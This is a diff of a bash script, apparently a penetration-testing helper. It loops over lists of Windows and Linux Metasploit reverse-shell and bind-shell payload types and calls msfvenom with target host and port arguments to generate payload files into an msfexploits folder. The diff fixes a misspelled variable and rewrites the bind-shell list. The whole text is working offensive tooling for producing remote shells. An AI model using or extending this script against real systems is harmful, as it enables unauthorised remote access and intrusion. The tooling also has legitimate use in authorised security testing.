@@ -14,8 +14,9 @@ WrevshellTypes=("meterpreter_reverse_tcp" "x64/meterpreter_reverse_tcp" \
 "meterpreter/reverse_tcp" "x64/meterpreter/reverse_tcp" \
 "shell_reverse_tcp" "x64/shell_reverse_tcp" "shell/reverse_tcp" "x64/shell/reverse_tcp")
 
-WbindshellTypes=("meterpreter_bind_tcp" "x64/meterpreter_bind_tcp" "meterpreter/bind_tcp" \
-"x64/meterpreter/bind_tcp" "shell_bind_tcp" "x64/shell_bind_tcp")
+WbindshellTypes=("meterpreter_bind_tcp" "meterpreter/bind_tcp" "x64/meterpreter/bind_tcp" \
+ "meterpreter_bind_tcp" "shell_bind_tcp" "shell/bind_tcp" "x64/shell/bind_tcp" \
+"x64/shell_bind_tcp")
 
 LrevshellTypes=("x86/meterpreter_reverse_tcp" "x64/meterpreter_reverse_tcp" \
 "x86/meterpreter/reverse_tcp" "x64/meterpreter/reverse_tcp" "x86/shell_reverse_tcp" \
@@ -85,7 +86,7 @@ case $platform in
 	for bshell in "${WbindshellTypes[@]}";do
 		shellFilename=$(echo "$bshell" |tr -d /)
 		echo -e "${RED}$platform/$bshell${NC}"
-		msfvenom -p $platfrom/$bshell rhost=$1 lport=$3 -f $plat > msfexploits/$shellFilename.$plat;
+		msfvenom -p $platform/$bshell rhost=$1 lport=$3 -f $plat > msfexploits/$shellFilename.$plat;
 
 
 		if [[ -z "$formatShellcode" ]];then
